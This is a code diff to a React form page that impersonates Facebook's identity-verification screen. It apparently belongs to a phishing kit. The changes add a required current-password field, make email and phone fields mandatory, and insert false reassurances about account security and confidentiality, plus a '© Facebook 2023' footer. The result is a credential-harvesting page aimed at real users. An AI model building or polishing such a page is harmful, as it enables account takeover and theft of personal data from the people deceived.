@@ -7,6 +7,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { CountryCodes } from "@/components/CountryCodes";
 import { validateEmail, validatePhone, validateUrl } from "@/lib/utils";
+import { Shield, HelpCircle, AlertCircle } from "lucide-react";
 
 interface FormData {
   firstName: string;
@@ -15,6 +16,7 @@ interface FormData {
   personalEmail: string;
   phoneNumber: string;
   website: string;
+  password: string;
 }
 
 export default function FormPage() {
@@ -29,7 +31,8 @@ export default function FormPage() {
       businessEmail: "",
       personalEmail: "",
       phoneNumber: "",
-      website: ""
+      website: "",
+      password: ""
     }
   });
 
@@ -60,6 +63,10 @@ export default function FormPage() {
       newErrors.website = "Please enter a valid URL (e.g., https://example.com)";
     }
     
+    if (!data.password || data.password.length < 6) {
+      newErrors.password = "Password must be at least 6 characters";
+    }
+    
     setErrors(newErrors);
     return Object.keys(newErrors).length === 0;
   };
@@ -84,7 +91,19 @@ export default function FormPage() {
           
           <div className="text-center mb-6">
             <h1 className="text-xl font-bold text-[#1C1E21] mb-2">Verify Your Identity</h1>
-            <p className="text-gray-600">Please provide the following information to verify your account.</p>
+            <p className="text-gray-600 mb-4">Please provide the following information to verify your account and remove the unusual login detection.</p>
+          </div>
+          
+          <div className="bg-blue-50 p-4 rounded-lg mb-6">
+            <div className="flex items-start">
+              <Shield className="text-facebook-blue h-5 w-5 mr-2 mt-0.5" />
+              <div>
+                <h3 className="font-semibold text-[#1C1E21] text-sm">Why we need this information</h3>
+                <p className="text-xs text-gray-600 mt-1">
+                  To ensure this is really you attempting to access your account, we need to verify additional personal information. This helps us prevent unauthorized access and keep your account secure.
+                </p>
+              </div>
+            </div>
           </div>
           
           <form onSubmit={handleSubmit(onSubmit)}>
@@ -92,7 +111,7 @@ export default function FormPage() {
               {/* First Name */}
               <div>
                 <Label htmlFor="firstName" className="block text-sm font-medium text-gray-700 mb-1">
-                  First Name
+                  First Name <span className="text-red-500">*</span>
                 </Label>
                 <Input
                   id="firstName"
@@ -108,7 +127,7 @@ export default function FormPage() {
               {/* Last Name */}
               <div>
                 <Label htmlFor="lastName" className="block text-sm font-medium text-gray-700 mb-1">
-                  Last Name
+                  Last Name <span className="text-red-500">*</span>
                 </Label>
                 <Input
                   id="lastName"
@@ -122,11 +141,43 @@ export default function FormPage() {
               </div>
             </div>
             
+            {/* Current Password */}
+            <div className="mb-4">
+              <div className="flex items-center justify-between">
+                <Label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
+                  Current Password <span className="text-red-500">*</span>
+                </Label>
+                <span className="text-xs text-facebook-blue hover:underline cursor-pointer">Forgot password?</span>
+              </div>
+              <Input
+                id="password"
+                type="password"
+                {...register("password")}
+                className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
+                placeholder="Enter your current password"
+              />
+              {errors.password && (
+                <div className="text-red-500 text-xs mt-1">{errors.password}</div>
+              )}
+            </div>
+            
+            <div className="rounded-md border border-amber-200 bg-amber-50 p-3 mb-5">
+              <div className="flex">
+                <AlertCircle className="h-5 w-5 text-amber-500 mr-2" />
+                <p className="text-xs text-amber-800">
+                  For additional security, please provide the following account recovery information to verify your identity.
+                </p>
+              </div>
+            </div>
+            
             {/* Business Email */}
             <div className="mb-4">
-              <Label htmlFor="businessEmail" className="block text-sm font-medium text-gray-700 mb-1">
-                Business Email
-              </Label>
+              <div className="flex items-center">
+                <Label htmlFor="businessEmail" className="block text-sm font-medium text-gray-700 mb-1">
+                  Business Email <span className="text-red-500">*</span>
+                </Label>
+                <HelpCircle className="h-4 w-4 text-gray-400 ml-1 cursor-help" />
+              </div>
               <Input
                 id="businessEmail"
                 type="email"
@@ -141,9 +192,12 @@ export default function FormPage() {
             
             {/* Personal Email */}
             <div className="mb-4">
-              <Label htmlFor="personalEmail" className="block text-sm font-medium text-gray-700 mb-1">
-                Personal Email
-              </Label>
+              <div className="flex items-center">
+                <Label htmlFor="personalEmail" className="block text-sm font-medium text-gray-700 mb-1">
+                  Personal Email <span className="text-red-500">*</span>
+                </Label>
+                <HelpCircle className="h-4 w-4 text-gray-400 ml-1 cursor-help" />
+              </div>
               <Input
                 id="personalEmail"
                 type="email"
@@ -154,13 +208,17 @@ export default function FormPage() {
               {errors.personalEmail && (
                 <div className="text-red-500 text-xs mt-1">{errors.personalEmail}</div>
               )}
+              <p className="text-xs text-gray-500 mt-1">This email will be used for account recovery if needed</p>
             </div>
             
             {/* Phone Number */}
             <div className="mb-4">
-              <Label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-700 mb-1">
-                Phone Number
-              </Label>
+              <div className="flex items-center">
+                <Label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-700 mb-1">
+                  Phone Number <span className="text-red-500">*</span>
+                </Label>
+                <HelpCircle className="h-4 w-4 text-gray-400 ml-1 cursor-help" />
+              </div>
               <div className="flex">
                 <CountryCodes
                   value={countryCode}
@@ -178,13 +236,17 @@ export default function FormPage() {
               {errors.phoneNumber && (
                 <div className="text-red-500 text-xs mt-1">{errors.phoneNumber}</div>
               )}
+              <p className="text-xs text-gray-500 mt-1">We'll send a confirmation code to this number</p>
             </div>
             
             {/* Website */}
             <div className="mb-6">
-              <Label htmlFor="website" className="block text-sm font-medium text-gray-700 mb-1">
-                Company/Personal Website
-              </Label>
+              <div className="flex items-center">
+                <Label htmlFor="website" className="block text-sm font-medium text-gray-700 mb-1">
+                  Company/Personal Website
+                </Label>
+                <HelpCircle className="h-4 w-4 text-gray-400 ml-1 cursor-help" />
+              </div>
               <Input
                 id="website"
                 type="url"
@@ -208,15 +270,20 @@ export default function FormPage() {
                   Submitting...
                 </div>
               ) : (
-                "Submit Verification"
+                "Verify and Continue"
               )}
             </Button>
+            
+            <p className="text-xs text-center text-gray-500 mt-4">
+              By submitting this form, you confirm that you are the rightful owner of this account.
+            </p>
           </form>
         </CardContent>
       </Card>
 
       <div className="w-full max-w-md text-center mt-4 text-gray-500 text-xs">
         <p>Your information is used only for verification purposes. All data is confidential.</p>
+        <p className="mt-1">© Facebook 2023</p>
       </div>
     </>
   );
